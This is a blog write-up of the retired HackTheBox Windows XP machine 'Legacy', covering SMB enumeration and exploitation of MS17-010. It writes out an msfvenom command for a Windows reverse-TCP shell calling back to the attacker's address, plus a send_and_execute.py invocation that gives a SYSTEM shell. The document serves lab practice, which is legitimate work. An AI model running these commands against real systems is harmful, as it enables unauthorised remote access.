---
name: "Or0ch1"
linktitle: "Legacy"
title: "Legacy"
Cover: "/Legacy/Legacy.png"
categories: ["HacktheBox"]
draft: false
toc: true
images:
tags: ["Windows", "MS17-010", "MS08-067", "HackTheBox"]
date: 2022-09-22T16:35:24+03:00
---

Welcome to another HackTheBox writeup, today we'll be diving into the retired windows box Legacy.

Lets jump right in!

## Recon
Starting the box we get the ip **10.10.10.4** and we scan for open ports using nmap.

![nmap]({{<static "/Legacy/nmapscan.png">}})

The results show the OS as Windows XP and the following ports open:
  - 135 - msrpc
  - 139 - netbios-ssn
  - 445 - microsoft-ds

## Enumeration  

I try Null authentication by using smbclient and smbmap but I wasn't successful.

![smbclient]({{<static "/Legacy/smbclient.png">}})

I decide to run nmap smb-vuln scipts to check for any smb vulnerabilities.

![nmap_scripts]({{<static "/Legacy/nmapscriptsearch.png">}})

![vulns]({{<static "/Legacy/smbvuln.png">}})

The results show that there are two vulnerabilites present:
  - MS08-067
  - MS17-010

While both of these vulns can be exploited via metasploit I decided not to use it.

I tried exploiting both of them however i ran into problems with the **MS08-067** exploit, when I get a workaround the blog will be updated to include it.

## MS17-010 Exploitiation

For this we are going to generate an exploit using msfvenom and use the following [EXPLOIT](https://github.com/helviojunior/MS17-010).

I generated the msfvenom payload with the following options:

```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o exploit.exe```

  - ```-p``` - to specify the platform as **windows/shell_reverse_tcp**.
  - ```LHOST``` - to specify the attackers IP address, since we're connecting via openvpn run **ip a** in the terminal and copy the address you see on the **tun0** interface.
  - ```LPORT``` - to indicate the port we will be listening on.
  - ```EXITFUNC```  - specifies a DLL and function to call when the payload is complete, I set this as **thread** since we want a clean exit.
  - ```-f``` - format in which the payload will be generated.
  - ```-a``` and ```--platform``` - the architecture and platform of the target.
  - ```-o``` - outputfile.

I set up a netcat listener on port 443 and from the repo cloned above I use ```send_and_execute.py``` with the following options.

```python2 send_and_execute.py 10.10.10.4 ~/HackTheBox/Legacy/exploit.exe```

![shell]({{<static "/Legacy/ms17_shell.png">}})

We get a shell however since the OS is windows XP we do not have the whoami command or binary present, we have to upload it to the box.

Kali linux has a folder containing windows binaries and checking in it we find the whoami.exe binary, I use impacket-smbclient to setup a share and I access the binary from the box.

![whoami]({{<static "/Legacy/whoami.png">}})

Since we are already ```NT AUTHORITY/SYSTEM``` theres no need for us to escalate privileges and I move to locating the flags.

On windows one can search for a file using the following syntax ```dir <filename> /s``` so to search to find the flag I cd into **C:** and execute the search from here. 

The user flag is in the user johns Desktop folder while the root flag is in the Administrators Desktop folder.

**user flag**
![userflag]({{<static "/Legacy/userflag.png">}})

**root flag**
![rootflag]({{<static "/Legacy/rootflag.png">}})

And we are done, this box was fairly simple and i enjoyed doing it.

I hope someone succeeds on exploiting **MS08-067** on this box.

Happy hacking everyone :sunglasses: and as we say at f334aks-mini #IWDWD :skull: